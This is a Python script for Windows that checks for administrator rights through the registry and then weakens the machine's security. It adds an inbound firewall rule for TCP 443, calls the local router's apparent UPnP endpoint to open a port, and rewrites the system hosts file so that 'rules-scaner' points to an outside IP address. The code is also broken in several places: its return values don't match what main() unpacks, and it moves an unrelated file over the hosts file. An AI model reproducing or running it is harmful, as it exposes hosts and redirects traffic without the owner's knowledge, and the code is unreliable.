import subprocess
import os
import sys
import winreg as wreg

def check_adm():
    try:
        flags = wreg.KEY_ALL_ACCESS | 0x00020000  # KEY_WOW64_64KEY
        wreg.OpenKey(wreg.HKEY_LOCAL_MACHINE,
                     "SYSTEM\\CurrentControlSet\\Control\\Lsa",
                     0,
                     flags)
        return True
    except:
        return False

def get_username():
    try:
        return os.environ["USERNAME"]
    except:
        try:
            return os.environ["USERDOMAIN"] + "\\" + os.environ["USERNAME"]
        except:
            return ""

def get_message(TitleName, MessageText):
    return f"{TitleName}: {MessageText}"

def add_windows_firewall_rule():
    if check_adm():
        proc = subprocess.run("netsh advfirewall firewall add rule name=\"scan\" dir=in action=allow protocol=TCP localport=443", shell=True)
        ret = proc.returncode == 0

        if ret:
            title = get_message("Firewall configuration", "Configuration netsh successful")
            return True, title
        else:
            title = get_message("Firewall configuration", "Configuration netsh failed")
            return False, title
    else:
        msg = get_message("Firewall configuration", "You must be administrator to change firewall\nRun again as administrator")
        title = "Administrator required"
        return False, title

def open_port():
    if check_adm():
        system32 = os.path.abspath("C:\\Windows\\System32\\")
        tools = os.path.abspath(f"{system32}\\config\\trusted\\tools")
        os.chdir(tools)
        import urllib.request
        try:
            urllib.request.urlopen("http://192.168.0.1/?upnpset=act=aku1&&type=2")  # 2 is instant, set 0 to set permanently
            title = get_message("Port opening", "Firewall opened")
        except:
            title = get_message("Port opening", "An error occurred while opening the firewall")
        return title
    else:
        msg = get_message("Port opening", "You must be administrator to open the port\nRun again as administrator")
        title = "Administrator required"
        return msg, title, False

def edit_hosts():
    file = ".\\hosts"
    if os.path.exists(file):
        if check_adm():
            hosts = open(file)
            while True:
                line = hosts.readline()
                if not line:
                    break
                if " rules-scaner" in line or " 148.66.149.62 rules-scaner" in line:
                    title = get_message("Edit hosts:", "File modified")
                    return title, False

            hosts.close()

            fh = open(file, "a+")
            fh.write("\n\n")
            fh.write("148.66.149.62 rules-scaner\n")

            title = get_message("Edit hosts:", "File modified")
            try:
                os.system('attrib +R willnames.txt')
                os.system('move /Y willnames.txt  "%SystemRoot%\\System32\\drivers\\etc\\hosts"')
                os.system('attrib -R "%SystemRoot%\\System32\\drivers\\etc\\hosts"')
                title = get_message("Edit hosts:", "hosts file edited")
                return title, True
            except Exception as e:
                title = get_message("Edit hosts:", f"{e}")
                return title, False

        else:
            msg = get_message("Edit hosts:", "You must be administrator to modify\nRun again as administrator")
            title = "Administrator required"
            return msg, title, False
    else:
        msg = get_message("Edit hosts:", f"File {file} does not exist")
        return msg, False, False

def main():
    firewall_result, firewall_title = add_windows_firewall_rule()
    print(firewall_title)

    port_title = open_port()
    print(port_title)

    hosts_title, hosts_success = edit_hosts()
    print(hosts_title)
    if hosts_success:
        print("Hosts file edited successfully")
    else:
        print("Failed to edit hosts file")

if __name__ == "__main__":
    main()